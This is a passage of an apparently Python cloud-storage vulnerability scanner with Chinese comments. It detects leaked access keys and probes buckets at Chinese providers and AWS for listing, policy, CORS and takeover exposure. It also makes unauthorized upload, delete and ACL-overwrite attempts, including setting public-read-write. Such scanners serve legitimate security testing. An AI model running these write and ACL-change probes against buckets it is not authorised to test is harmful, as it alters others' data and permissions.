        "?list-type=2",
        "?list-type=2&max-keys=100",
        "?delimiter=/&prefix=",
        "?acl",
        "?policy",
        "?cors",
        "?location",
        "?logging",
        "?versioning",
        "?requestPayment",
        "?website",
        "?tagging",
        "?lifecycle",
        "?referer",
        "?object-lock",
        "?encryption",
    ]
    
    # 存储桶提供商配置
    BUCKET_PROVIDERS = {
        "阿里云OSS": {
            "domains": [".aliyuncs.com", ".oss-cn-"],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>", "<Contents>"],
            "takeover_indicators": ["NoSuchBucket", "The specified bucket does not exist"],
            "acl_indicators": ["<AccessControlPolicy>", "<Grant>", "<Grantee>"],
            "policy_indicators": ["Version", "Statement", "Effect", "Principal"],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "AliyunOSS",
        },
        "腾讯云COS": {
            "domains": [".myqcloud.com", ".cos."],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>", "<Contents>"],
            "takeover_indicators": ["NoSuchBucket", "The specified bucket does not exist"],
            "acl_indicators": ["<AccessControlPolicy>", "<Grant>", "<Grantee>"],
            "policy_indicators": ["version", "statement", "principal"],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "tencent-cos",
        },
        "华为云OBS": {
            "domains": [".myhuaweicloud.com", ".obs."],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>", "<Contents>"],
            "takeover_indicators": ["NoSuchBucket", "The specified bucket does not exist"],
            "acl_indicators": ["<AccessControlPolicy>", "<Grant>", "<Grantee>"],
            "policy_indicators": ["Version", "Statement", "Effect"],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "OBS",
        },
        "AWS S3": {
            "domains": [".amazonaws.com", ".s3."],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>", "<Contents>"],
            "takeover_indicators": ["NoSuchBucket", "The specified bucket does not exist"],
            "acl_indicators": ["<AccessControlPolicy>", "<Grant>", "<Grantee>"],
            "policy_indicators": ["Version", "Statement", "Effect", "Principal"],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "AmazonS3",
        },
        "百度云BOS": {
            "domains": [".bcebos.com"],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>", "<Contents>"],
            "takeover_indicators": ["NoSuchBucket"],
            "acl_indicators": ["<AccessControlPolicy>"],
            "policy_indicators": ["version", "statements"],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "BaiduBOS",
        },
        "七牛云Kodo": {
            "domains": [".qiniudn.com", ".clouddn.com", ".qiniucs.com", ".qcloudcdn.com"],
            "list_indicators": ["<item>", "<key>", "<hash>"],
            "takeover_indicators": ["no such bucket", "bucket not found"],
            "acl_indicators": [],
            "policy_indicators": [],
            "upload_test": False,
            "put_object_path": "",
            "server_header": "qiniu",
        },
        "又拍云USS": {
            "domains": [".upaiyun.com", ".b0.upaiyun.com", ".upyun.com", ".upcdn.net"],
            "list_indicators": [],
            "takeover_indicators": ["bucket not found", "not exist"],
            "acl_indicators": [],
            "policy_indicators": [],
            "upload_test": False,
            "put_object_path": "",
            "server_header": "upyun",
        },
        "青云QingStor": {
            "domains": [".qingstor.com"],
            "list_indicators": ["<name>", "<created>"],
            "takeover_indicators": ["bucket not found", "not exist"],
            "acl_indicators": [],
            "policy_indicators": [],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "QingStor",
        },
        "金山云KS3": {
            "domains": [".ksyuncs.com", ".ks3-cn-"],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>"],
            "takeover_indicators": ["NoSuchBucket"],
            "acl_indicators": ["<AccessControlPolicy>"],
            "policy_indicators": [],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "KS3",
        },
        "京东云OSS": {
            "domains": [".jcloudcs.com"],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>"],
            "takeover_indicators": ["NoSuchBucket"],
            "acl_indicators": [],
            "policy_indicators": [],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "JCloud",
        },
        "天翼云OOS": {
            "domains": [".ctyun.cn", ".ctyunapi.cn", ".oos-"],
            "list_indicators": ["ListBucketResult", "<Key>", "<Name>"],
            "takeover_indicators": ["NoSuchBucket"],
            "acl_indicators": [],
            "policy_indicators": [],
            "upload_test": True,
            "put_object_path": "/test-vuln-check.txt",
            "server_header": "CT-OOS",
        },
    }
    
    # 上传测试文件内容
    UPLOAD_TEST_CONTENT = "This is a vulnerability test file. Please delete it."
    
    def __init__(self, session: requests.Session, timeout: int = 15):
        self.session = session
        self.timeout = timeout
        self.findings: List[VulnResult] = []
    
    def test_cloud_security(self, url: str, content: str = "") -> List[VulnResult]:
        """主入口：执行所有云安全测试"""
        findings = []
        
        # 1. 检测Access Key泄露
        findings.extend(self._detect_cloud_keys(content, url))
        
        # 2. 检测存储桶URL
        findings.extend(self._detect_bucket_urls(content, url))
        
        # 3. 测试存储桶遍历
        findings.extend(self._test_bucket_traversal(url))
        
        # 4. 测试存储桶接管
        findings.extend(self._test_bucket_takeover(url))
        
        # 5. 测试Policy配置泄露
        findings.extend(self._test_bucket_policy(url))
        
        # 6. 测试未授权上传
        findings.extend(self._test_unauthorized_upload(url))
        
        # 7. 测试未授权删除
        findings.extend(self._test_unauthorized_delete(url))
        
        # 8. 测试ACL可写
        findings.extend(self._test_acl_writable(url))
        
        # 9. 测试跨域配置
        findings.extend(self._test_cors_configuration(url))
        
        self.findings.extend(findings)
        return findings
    
    def _detect_cloud_keys(self, content: str, source: str) -> List[VulnResult]:
        """检测云Access Key泄露"""
        findings = []
        content_lower = content.lower()
        
        for key_name, key_info in self.CLOUD_KEY_PATTERNS.items():
            try:
                pattern = key_info["pattern"]
                context = key_info.get("context", "")
                severity = key_info.get("severity", "High")
                
                # 检查上下文
                if context and not re.search(context, content_lower):
                    continue
                
                matches = re.findall(pattern, content)
                for match in set(matches):
                    # 过滤常见误报
                    if self._is_false_positive(match):
                        continue
                    
                    findings.append(VulnResult(
                        vuln_type="Cloud Access Key Leak",
                        severity=severity,
                        url=source,
                        param="",
                        payload=match[:30] + "..." if len(match) > 30 else match,
                        detail=f"发现{key_name}泄露",
                        evidence=match[:50]
                    ))
            except Exception as e:
                logger.debug(f"Cloud key detection error: {e}")
        
        return findings
    
    def _detect_bucket_urls(self, content: str, source: str) -> List[VulnResult]:
        """检测存储桶URL泄露"""
        findings = []
        
        for provider, pattern in self.BUCKET_PATTERNS.items():
            try:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in set(matches):
                    findings.append(VulnResult(
                        vuln_type="Cloud Storage Bucket URL",
                        severity="Medium",
                        url=source,
                        param="",
                        payload=match,
                        detail=f"发现{provider}存储桶URL",
                        evidence=match
                    ))
            except Exception as e:
                logger.debug(f"Bucket URL detection error: {e}")
        
        return findings
    
    def _test_bucket_traversal(self, base_url: str) -> List[VulnResult]:
        """测试存储桶遍历漏洞"""
        findings = []
        
        # 识别存储桶提供商
        provider = self._detect_bucket_provider(base_url)
        if not provider:
            return findings
        
        provider_config = self.BUCKET_PROVIDERS.get(provider, {})
        list_indicators = provider_config.get("list_indicators", [])
        acl_indicators = provider_config.get("acl_indicators", [])
        
        # 测试遍历Payload
        for payload in self.BUCKET_TRAVERSAL_PAYLOADS:
            try:
                test_url = base_url.rstrip('/') + payload
                request_str = build_http_request('GET', test_url)
                r = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                response_str = format_response(r)
                
                # 检查是否返回文件列表
                if r.status_code == 200:
                    content = r.text
                    content_lower = content.lower()
                    
                    # 判断是否包含文件列表特征
                    if list_indicators and any(indicator.lower() in content_lower for indicator in list_indicators):
                        findings.append(VulnResult(
                            vuln_type="Cloud Storage Bucket Traversal",
                            severity="High",
                            url=test_url,
                            param="",
                            payload=payload,
                            detail=f"{provider}存在存储桶遍历漏洞",
                            evidence=f"Status: {r.status_code}, Content: {content[:150]}",
                            request=request_str,
                            response=response_str
                        ))
                        break
                    
                    # 检查ACL泄露
                    if acl_indicators and any(indicator.lower() in content_lower for indicator in acl_indicators):
                        findings.append(VulnResult(
                            vuln_type="Cloud Storage ACL Leak",
                            severity="High",
                            url=test_url,
                            param="",
                            payload=payload,
                            detail=f"{provider}存储桶ACL配置泄露",
                            evidence=content[:200],
                            request=request_str,
                            response=response_str
                        ))
                        
            except Exception as e:
                logger.debug(f"Bucket traversal test error: {e}")
        
        return findings
    
    def _test_bucket_takeover(self, url: str) -> List[VulnResult]:
        """测试存储桶接管漏洞"""
        findings = []
        
        # 识别存储桶提供商
        provider = self._detect_bucket_provider(url)
        if not provider:
            return findings
        
        provider_config = self.BUCKET_PROVIDERS.get(provider, {})
        takeover_indicators = provider_config.get("takeover_indicators", [])
        
        if not takeover_indicators:
            return findings
        
        try:
            r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            content = r.text.lower()
            
            # 检查NoSuchBucket错误
            if any(indicator.lower() in content for indicator in takeover_indicators):
                findings.append(VulnResult(
                    vuln_type="Cloud Storage Bucket Takeover",
                    severity="Critical",
                    url=url,
                    param="",
                    payload="",
                    detail=f"{provider}存储桶可被接管（NoSuchBucket）",
                    evidence=f"响应包含: {takeover_indicators[0]}"
                ))
                    
        except Exception as e:
            logger.debug(f"Bucket takeover test error: {e}")
        
        return findings
    
    def _test_bucket_policy(self, url: str) -> List[VulnResult]:
        """测试存储桶Policy配置泄露"""
        findings = []
        
        # 识别存储桶提供商
        provider = self._detect_bucket_provider(url)
        if not provider:
            return findings
        
        provider_config = self.BUCKET_PROVIDERS.get(provider, {})
        policy_indicators = provider_config.get("policy_indicators", [])
        
        if not policy_indicators:
            return findings
        
        try:
            policy_url = url.rstrip('/') + "?policy"
            r = self.session.get(policy_url, timeout=self.timeout, allow_redirects=False)
            
            if r.status_code == 200:
                content = r.text
                
                # 检查是否包含Policy特征
                if any(indicator in content for indicator in policy_indicators):
                    findings.append(VulnResult(
                        vuln_type="Cloud Storage Policy Leak",
                        severity="High",
                        url=policy_url,
                        param="",
                        payload="?policy",
                        detail=f"{provider}存储桶Policy配置泄露",
                        evidence=content[:300]
                    ))
                    
        except Exception as e:
            logger.debug(f"Bucket policy test error: {e}")
        
        return findings
    
    def _test_unauthorized_upload(self, url: str) -> List[VulnResult]:
        """测试存储桶未授权上传"""
        findings = []
        
        # 识别存储桶提供商
        provider = self._detect_bucket_provider(url)
        if not provider:
            return findings
        
        provider_config = self.BUCKET_PROVIDERS.get(provider, {})
        
        # 检查是否支持上传测试
        if not provider_config.get("upload_test", False):
            return findings
        
        put_path = provider_config.get("put_object_path", "/test-vuln-check.txt")
        
        try:
            put_url = url.rstrip('/') + put_path
            
            # 尝试PUT上传
            headers = {
                "Content-Type": "text/plain",
            }
            
            r = self.session.put(
                put_url, 
                data=self.UPLOAD_TEST_CONTENT,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # 检查上传是否成功
            if r.status_code in [200, 201]:
                findings.append(VulnResult(
                    vuln_type="Cloud Storage Unauthorized Upload",
                    severity="Critical",
                    url=put_url,
                    param="",
                    payload="PUT " + put_path,
                    detail=f"{provider}存储桶存在未授权上传漏洞",
                    evidence=f"Status: {r.status_code}, Response: {r.text[:100]}"
                ))
            
            # 检查是否返回了可写权限的错误信息
            elif r.status_code == 403:
                content_lower = r.text.lower()
                if any(keyword in content_lower for keyword in ['accessdenied', 'forbidden', 'not allowed']):
                    # 这是正常的，没有漏洞
                    pass
                    
        except Exception as e:
            logger.debug(f"Unauthorized upload test error: {e}")
        
        return findings
    
    def _test_unauthorized_delete(self, url: str) -> List[VulnResult]:
        """测试存储桶未授权删除"""
        findings = []
        
        # 识别存储桶提供商
        provider = self._detect_bucket_provider(url)
        if not provider:
            return findings
        
        provider_config = self.BUCKET_PROVIDERS.get(provider, {})
        
        # 检查是否支持删除测试
        if not provider_config.get("upload_test", False):
            return findings
        
        # 先尝试上传一个测试文件，然后删除它
        test_file = "/test-delete-check.txt"
        put_url = url.rstrip('/') + test_file
        delete_url = put_url
        
        try:
            # 先上传测试文件
            headers = {"Content-Type": "text/plain"}
            upload_resp = self.session.put(
                put_url,
                data=self.UPLOAD_TEST_CONTENT,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # 只有上传成功才测试删除
            if upload_resp.status_code in [200, 201]:
                # 尝试删除
                delete_resp = self.session.delete(
                    delete_url,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                if delete_resp.status_code in [200, 202, 204]:
                    findings.append(VulnResult(
                        vuln_type="Cloud Storage Unauthorized Delete",
                        severity="Critical",
                        url=delete_url,
                        param="",
                        payload="DELETE " + test_file,
                        detail=f"{provider}存储桶存在未授权删除漏洞",
                        evidence=f"Status: {delete_resp.status_code}"
                    ))
                    
        except Exception as e:
            logger.debug(f"Unauthorized delete test error: {e}")
        
        return findings
    
    def _test_acl_writable(self, url: str) -> List[VulnResult]:
        """测试存储桶ACL是否可写"""
        findings = []
        
        # 识别存储桶提供商
        provider = self._detect_bucket_provider(url)
        if not provider:
            return findings
        
        provider_config = self.BUCKET_PROVIDERS.get(provider, {})
        acl_indicators = provider_config.get("acl_indicators", [])
        
        # 如果厂商不支持ACL，跳过
        if not acl_indicators:
            return findings
        
        try:
            acl_url = url.rstrip('/') + "?acl"
            
            # 尝试PUT修改ACL
            acl_body = '''<?xml version="1.0" encoding="UTF-8"?>
<AccessControlPolicy xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Owner><ID>test</ID><DisplayName>test</DisplayName></Owner>
<AccessControlList>
<Grant><Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser"><ID>test</ID><DisplayName>test</DisplayName></Grantee><Permission>READ</Permission></Grant>
</AccessControlList>
</AccessControlPolicy>'''
            
            headers = {"Content-Type": "application/xml"}
            
            r = self.session.put(
                acl_url,
                data=acl_body,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # 检查是否成功修改ACL
            if r.status_code in [200, 201, 204]:
                findings.append(VulnResult(
                    vuln_type="Cloud Storage ACL Writable",
                    severity="Critical",
                    url=acl_url,
                    param="",
                    payload="PUT ?acl",
                    detail=f"{provider}存储桶ACL可写，存在未授权访问风险",
                    evidence=f"Status: {r.status_code}"
                ))
            
            # 某些厂商使用特定Header设置ACL
            elif provider in ["腾讯云COS"]:
                headers_cos = {"x-cos-acl": "public-read-write"}
                r2 = self.session.put(
                    acl_url,
                    headers=headers_cos,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                if r2.status_code in [200, 201, 204]:
                    findings.append(VulnResult(
                        vuln_type="Cloud Storage ACL Writable",
                        severity="Critical",
                        url=acl_url,
                        param="",
                        payload="x-cos-acl: public-read-write",
                        detail=f"{provider}存储桶ACL可写，存在未授权访问风险",
                        evidence=f"Status: {r2.status_code}"
                    ))
                    
        except Exception as e:
            logger.debug(f"ACL writable test error: {e}")
        
        return findings
    
    def _test_cors_configuration(self, url: str) -> List[VulnResult]:
        """测试存储桶CORS配置"""
        findings = []
        
        # 识别存储桶提供商
        provider = self._detect_bucket_provider(url)
        if not provider:
            return findings
        
        try:
            cors_url = url.rstrip('/') + "?cors"
            r = self.session.get(cors_url, timeout=self.timeout, allow_redirects=False)
            
            if r.status_code == 200:
                content = r.text.lower()
                
                # 检查CORS配置特征
                if any(keyword in content for keyword in ['corsconfiguration', '<corsrule>', 'allowedorigin']):
                    findings.append(VulnResult(
                        vuln_type="Cloud Storage CORS Config Leak",
                        severity="Medium",
                        url=cors_url,
                        param="",
                        payload="?cors",
                        detail=f"{provider}存储桶CORS配置泄露",
                        evidence=r.text[:200]
                    ))
                    
        except Exception as e:
            logger.debug(f"CORS configuration test error: {e}")
        
        return findings
    
    def _detect_bucket_provider(self, url: str) -> Optional[str]:
        """识别存储桶提供商 - 通过URL域名和Server Header"""
        url_lower = url.lower()
        
        # 首先通过URL域名识别
        for provider, config in self.BUCKET_PROVIDERS.items():
            domains = config.get("domains", [])
            for domain in domains:
                if domain.lower() in url_lower:
                    return provider
        
        # 如果域名无法识别，尝试通过Server Header识别
        try:
            r = self.session.head(url, timeout=5, allow_redirects=True)
            server = r.headers.get('Server', '') or r.headers.get('server', '')
            
            if server:
                server_lower = server.lower()
                for provider, config in self.BUCKET_PROVIDERS.items():
                    server_header = config.get("server_header", "")
                    if server_header and server_header.lower() in server_lower:
                        return provider
                        
        except Exception as e:
            logger.debug(f"Server header detection error: {e}")
        
        return None
    
    def _is_false_positive(self, match: str) -> bool:
        """过滤常见误报"""
        # 云Access Key不应该被过滤
        cloud_key_patterns = [
            r'^LTAI[a-zA-Z0-9]{12,20}$',  # 阿里云
            r'^AKID[a-zA-Z0-9]{13,20}$',   # 腾讯云
            r'^AKIA[0-9A-Z]{16}$',         # AWS
            r'^JDC_[A-Z0-9]{28,32}$',      # 京东云
            r'^GOOG[\w\W]{10,30}$',        # Google Cloud
        ]
        for pattern in cloud_key_patterns:
            if re.match(pattern, match):
                return False
        
        false_patterns = [
            r'^[a-f0-9]{32}$',  # MD5
            r'^[a-f0-9]{40}$',  # SHA1
            r'^[a-f0-9]{64}$',  # SHA256
            r'^[0-9a-zA-Z+/]{40,}={0,2}$',  # Base64
            r'^[0-9]+$',  # 纯数字
            r'^[a-zA-Z]+$',  # 纯字母
            # 移除通用标识符过滤，因为它会误报云密钥
            # r'^[a-zA-Z0-9_-]{8,}$',  # 通用标识符
        ]
        
        for pattern in false_patterns:
            if re.match(pattern, match):
                return True
        
        # 检查是否是常见的CSS类名或变量名
        common_prefixes = ['class', 'style', 'data-', 'aria-', 'ng-', 'v-', 'vue-', 
                          'react', 'angular', 'jquery', 'bootstrap', 'antd', 'element-',
                          'el-', 'ivu-', 'van-', 'uni-', 'u-', 'i-', 'm-', 't-', 'a-',
                          'b-', 'c-', 'd-', 'e-', 'f-', 'g-', 'h-', 'i-', 'j-', 'k-',
                          'l-', 'm-', 'n-', 'o-', 'p-', 'q-', 'r-', 's-', 't-', 'u-',
                          'v-', 'w-', 'x-', 'y-', 'z-']
        
        match_lower = match.lower()
        for prefix in common_prefixes:
            if match_lower.startswith(prefix):
                return True
        
        return False


# 导出云安全测试函数
def test_cloud_security(session: requests.Session, url: str, content: str = "") -> List[VulnResult]:
    """云安全测试入口函数"""
    tester = CloudSecurityTester(session)
    return tester.test_cloud_security(url, content)
